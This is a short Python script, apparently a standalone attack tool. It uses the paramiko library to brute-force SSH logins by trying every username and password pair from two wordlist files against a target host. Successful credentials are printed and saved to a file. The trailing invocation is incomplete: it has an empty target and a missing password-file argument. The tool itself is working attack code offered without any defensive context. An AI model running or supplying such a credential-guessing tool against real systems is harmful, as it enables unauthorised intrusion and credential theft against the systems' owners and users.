import paramiko
import os 

def ssh_brute_force(hostname, user_file, pass_file):
    # Read usernames and passwords from files
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    if not os.path.exists(user_file) or not os.path.exists(pass_file):
        print("[-] Error: User or Password file not found  ")
        return 
    
    with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
        user_list = [u.strip() for u in users.readlines()]
        pass_list = [p.strip() for p in passwords.readlines()]
        
        
        
    for username in user_list:
        for password in pass_list:
            try:
                print(f"[*] Trying {username}:{password}")
                client.connect(hostname, username=username, password=password, timeout=1)
                
                print(f"\n[+] Success! Found credentials: {username};{password}\n")
                
                with open("found_creds.txt","a") as f:
                    f.write(f"{hostname} -> {username}:{password}\n")
                            
                client.close()
                return 
                
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"[-] Error on {username}: {e}")
                break
                
target = ""
ssh_brute_force(target, "users.txt", )

